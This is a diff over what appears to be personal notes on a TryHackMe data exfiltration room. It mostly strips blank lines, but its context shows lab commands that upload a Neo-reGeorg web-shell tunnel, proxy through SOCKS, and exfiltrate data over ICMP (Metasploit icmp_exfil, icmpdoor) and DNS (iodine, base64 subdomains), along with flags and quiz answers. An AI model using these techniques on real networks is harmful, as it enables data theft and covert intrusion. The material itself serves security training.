@@ -38,7 +38,6 @@ Room Prerequisites
 Network Infrastructure
 For this room, we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The provided VM contains two separated networks with multiple clients. We also have a "JumpBox" machine that accesses both networks. The following diagram shows more information about the network environment used in this room.
 
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)
 
 Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name, thm.com, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.
@@ -84,7 +83,6 @@ Lab Recommendation
     We recommend using the JumpBox and the network environment for most tasks (TCP, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. However, If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to 10.10.20.177. For more information about changing the DNS for AttackBox, check the DNS configuration (Task 8). 
 
     In most cases, we need to use two machines to establish communication. Thus, we need two or more Linux terminals available to complete the task. Therefore, we recommend using the tmux tool for creating multiple sessions over a single SSH login.
-
 
 Once you've deployed the VM, please wait a few minutes for the VM and the networks to start, then progress to the next task!
 
@@ -140,7 +138,6 @@ In the coming tasks, we will discuss the following techniques and use cases:
     Exfiltrate using HTTPS (POST request)
     ICMP
     DNS
-
 
 In which case scenario will sending and receiving traffic continue during the connection?
 *Tunneling*
@@ -324,13 +321,10 @@ root:toor
 
 Success! We exfiltrated data from a victim machine to an attacker machine using the TCP socket in this task.
 
-
-
 Exfiltration using TCP sockets relies on ____________ protocols! 
 *non-standard*
 
 Now apply what we discussed to exfiltrate data over the TCP socket! Once you exfiltrate data successfully, hit Completed to move on to the next task!
-
 
 ### Exfiltration using SSH 
 
@@ -390,13 +384,10 @@ root:toor
 	    
 ```
 
-
-
 All packets sent using the Data Exfiltration technique over SSH are encrypted! (T=True/F=False)
 *T*
 
 Replicate the steps to transfer data over the SSH client. Once you transfer the file successfully, hit Completed and move on to the next task!
-
 
 ###  Exfiltrate using HTTP(S) 
 
@@ -471,7 +462,6 @@ Connecting to Victim1 machine from Jump Box
 			
 thm@jump-box:~$ ssh thm@victim1.thm.com
 
-
 ```
 
 You can also connect to it from AttackBox using port 2022 as follow,
@@ -539,7 +529,6 @@ Fixing the http.bs64 file!
 thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
 ```
 
-
 Using the sed command, we replaced the spaces with + characters to make it a valid base64 string!
 
 ```
@@ -595,7 +584,6 @@ Generating encrypted Tunneling Clients with a selected password!
 			
 root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              
 
-
           "$$$$$$''  'M$  '$$$@m
         :$$$$$$$$$$$$$$''$$$$'
        '$'    'JZI'$$&  $$$$'
@@ -615,7 +603,6 @@ root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
              @$$$@L '    '<@$$$$$$$$`
            $$                 '$$$
 
-
     [ Github ] https://github.com/L-codes/neoreg
 
     [+] Mkdir a directory: neoreg_servers
@@ -628,7 +615,6 @@ root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
        => neoreg_servers/tunnel_compatibility.jspx
        => neoreg_servers/tunnel.php
 ```
-
 
 The previous command generates encrypted Tunneling clients with thm key in the neoreg_servers/ directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the tunnel.php file via the uploader machine. To access the uploader machine, you can visit the following URL: http://10.10.20.177/uploader or https://10-10-20-177.p.thmlabs.com/uploader without the need for a VPN.
 
@@ -658,7 +644,6 @@ Welcome to APP Server!
 ```
 
 The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.
-
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png)
 
@@ -736,10 +721,8 @@ Check the Apache log file on web.thm.com  and get the flag!
 Decode it using Base64
 *THM{H77P-G37-15-f0un6}*
 
-
 ```
 first connect to jump thm then thm web , initiallize neoreg then upload upload.php (all from attackbox) then use curl to get the flag
-
 
 root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
 The authenticity of host '10.10.20.177 (10.10.20.177)' can't be established.
@@ -776,10 +759,7 @@ To restore this content, you can run the 'unminimize' command.
 Last login: Mon Sep 12 16:58:52 2022 from 192.168.0.133
 thm@web-thm:~$ 
 
-
-
 root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
-
 
           "$$$$$$''  'M$  '$$$@m
         :$$$$$$$$$$$$$$''$$$$'
@@ -799,7 +779,6 @@ root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
                $$x$$$$$$$$$twelve$$$@$'
              @$$$@L '    '<@$$$$$$$$`
            $$                 '$$$
-
 
     [ Github ] https://github.com/L-codes/Neo-reGeorg
 
@@ -814,7 +793,6 @@ root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
 
 root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.20.177/uploader/files/tunnel.php
 
-
           "$$$$$$''  'M$  '$$$@m
         :$$$$$$$$$$$$$$''$$$$'
        '$'    'JZI'$$&  $$$$'
@@ -834,7 +812,6 @@ root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.
              @$$$@L '    '<@$$$$$$$$`
            $$                 '$$$
 
-
     [ Github ] https://github.com/L-codes/Neo-reGeorg
 
 +------------------------------------------------------------------------+
@@ -843,17 +820,12 @@ root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.
   Tunnel at:
     http://10.10.20.177/uploader/files/tunnel.php
 
-
-
 root@ip-10-10-99-235:/opt/Neo-reGeorg# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
 <p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}<
 ```
-![[Pasted image 20220912113401.png]]
-
 
 When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag?
 *THM{H77p_7unn3l1n9_l1k3_l337}*
-
 
 ### Exfiltration using ICMP 
 
@@ -931,7 +903,6 @@ ICMP Data Exfiltration
 Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)
-
 
 Now from the AttackBox, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,
 
@@ -1098,8 +1069,6 @@ To confirm that all communications go through the ICMP protocol, we capture the 
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)
 
-
-
 In which ICMP packet section can we include our data?
 *ping*
 
@@ -1116,7 +1085,6 @@ msf5 auxiliary(server/icmp_exfil) > run
 
 [*] ICMP Listener started on eth0 (10.10.99.235). Monitoring for trigger packet containing ^BOF
 [*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
-
 
 root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
 The authenticity of host '10.10.20.177 (10.10.20.177)' can't be established.
@@ -1209,14 +1177,6 @@ Nping done: 1 IP address pinged in 1.06 seconds
 thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192/168.0.133
 ^Cthm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
 
-
-
-
-
-
-
-
-
 root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
 thm@10.10.20.177's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
@@ -1268,7 +1228,6 @@ cat /tmp/flag.txt
 shell: THM{g0t-1cmp-p4k3t!}
 
 ```
-
 
 *THM{g0t-1cmp-p4k3t!}*
 
@@ -1379,7 +1338,6 @@ rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
 	    
 ```
 The DNS server must resolve the test.thm.com and test.tunnel.com domain names to 127.0.0.1, confirming that you're ready.
-
 
 Once the DNS configuration works fine, resolve the flag.thm.com  domain name. What is the IP address?
 
@@ -1543,7 +1501,6 @@ MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
 
 Now that we have the Base64 representation, we need to split it into one or multiple DNS requests depending on the output's length (DNS limitations) and attach it as a subdomain name. Let's show both ways starting with splitting for multiple DNS requests.
 
-
 ```
 Splitting the content into multiple DNS requests
 
@@ -1675,7 +1632,6 @@ Now replicate the C2 Communication steps to execute the content of the flag.tunn
 What is the maximum length for the subdomain name (label)?
 *63*
 
-
 The Fully Qualified FQDN domain name must not exceed ______ characters.
 *255*
 
@@ -1717,10 +1673,7 @@ We will be using the iodine tool for creating our DNS tunneling communications. 
     Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.
 https://github.com/yarrick/iodine
 
-
-
 Let's follow the steps to create a DNS tunnel. First, let's run the server-side application (iodined) as follows,
-
 
 ```
 Running iodined Server
@@ -1803,7 +1756,6 @@ We can confirm that all traffic goes through the DNS protocol by checking the Tc
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png)
 
 Apply the DNS tunneling technique in the provided network environment and access http://192.168.0.100/test.php to answer the question below.
-
 
 When the iodine connection establishes to Attacker, run the ifconfig command. How many interfaces are? (including the loopback interface)
 Execute "ifconfig" from JumpBox once the iodine connection is established.
@@ -2052,12 +2004,9 @@ thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
 
 ```
 
-
 *THM{DN5-Tunn311n9-1s-c00l}*
 
-
 ### Conclusion 
-
 
 Wrapping Up
 
@@ -2087,8 +2036,6 @@ Data Exfiltration is not limited to protocols and methods discussed in this room
 
 https://lots-project.com/
 
-
 Read the closing task.
-
 
 [[Windows Local Persistence]]
